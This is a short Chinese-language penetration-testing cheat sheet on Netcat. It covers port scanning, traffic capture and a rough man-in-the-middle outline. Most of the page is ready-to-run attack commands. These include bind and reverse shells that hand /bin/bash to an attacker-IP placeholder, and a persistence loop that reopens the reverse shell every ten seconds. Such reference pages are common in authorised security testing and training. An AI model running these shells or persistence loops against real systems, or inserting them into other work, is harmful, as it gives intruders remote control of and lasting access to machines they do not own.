---
description: 适用于渗透测试的各个阶段
---

# ✔️ Netcat

## 信息收集

使用netcat进行端口扫描，以发现目标主机上开放的端口：

```bash
// 端口号可自定义范围
nc -zv 目标IP 1-65535
```

## 绑定shell

在未授权访问测试中，使用netcat绑定反向/正向shell，以获取对目标系统的远程访问权限：

```bash
// 正向shell

// Target:
nc -lvnp 4444 -e /bin/bash
// Attacker:
nc -vn 目标IP 4444
```

```bash
// 反向shell

// Target:
nc -nv 攻方IP 4444 -e /bin/bash
// Attacker:
nc -lvnp 4444
```

## 信息截取

使用netcat进行流量截取，以分析目标主机和外部系统之间的通信内容：

```bash
// Attacker
nc -lvp 8080 > captured_traffic.txt
```

在攻方本机中开启监听，一旦有连接到达，netcat就会开始截取流量并将其写入指定的文件中（在本例中是captured\_traffic.txt）

### 中间人攻击

在网络中，可以将netcat放置在中间位置，拦截目标主机和外部系统之间的通信。这样，netcat就可以截取通信内容，而目标主机和外部系统则不会察觉到：

* 设置监听器：在攻方控制的位置上启动 Netcat，并将其设置为监听模式。监听器应该设置在一个适当的端口上，以便接收到目标主机和外部系统之间的通信。

```bash
// Attacker
nc -lvp 8080 > intercepted_traffic.txt
```

* 重定向流量：攻方需要使用路由器配置或其他技术手段来重定向目标主机和外部系统之间的流量到自己控制的位置。这样，所有通过该位置的流量都将被拦截和记录。
* 拦截通信：一旦流量被重定向到攻方控制的位置，并且Netcat处于监听状态，它就会开始拦截目标主机和外部系统之间的通信。所有的通信内容将被记录到指定的文件中（在本例中是intercepted\_traffic.txt）。
* 分析流量：攻方应该记录分析结果，并根据需要采取进一步的行动，例如通知目标系统管理员、修复安全漏洞或调查潜在的威胁。

## 维持权限

使用netcat建立持久化的反向shell连接，以确保对目标系统的长期访问权限:

```bash
// Target
while true; do nc -nv 攻方IP 4444 -e /bin/bash; sleep 10; done
// Attacker
nc -lvnp 4444
```

##
